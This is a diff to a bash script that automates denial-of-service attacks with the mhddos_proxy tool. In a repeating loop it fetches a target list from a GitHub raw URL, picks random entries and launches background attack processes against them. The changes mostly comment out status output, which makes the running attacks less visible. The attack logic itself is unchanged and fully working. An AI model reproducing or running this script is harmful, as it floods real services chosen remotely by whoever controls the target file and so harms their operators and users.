@@ -32,7 +32,7 @@ pkill -f ./start.py
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
-echo -e "#####################################\n"
+
 do
    # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
    list_size=$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]" | wc -l)
@@ -44,12 +44,12 @@ do
    echo -e "random number(s): " $random_numbers "\n"
 
    # Print all randomly selected targets on screen
-   echo -e "Choosen target(s):\n"
-   for i in $random_numbers
-   do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
-             echo -e "    "$target"\n"
-   done
+   
+   #for i in $random_numbers
+   # do
+   #          target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
+   #          
+   #done
 
    # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
@@ -58,12 +58,12 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
 
             #echo $cmd_line
-            echo $cmd_line $proxy_interval $rpc    #$threads
+            #echo $cmd_line $proxy_interval $rpc    #$threads
             cd ~/mhddos_proxy
             python3 runner.py $cmd_line $proxy_interval $rpc&   #$threads
             echo -e "Attack started. Wait a few minutes for output"
    done
-echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
+#echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
 sleep $restart_interval
 clear
  echo -e "\nRESTARTING\nKilling old processes..."
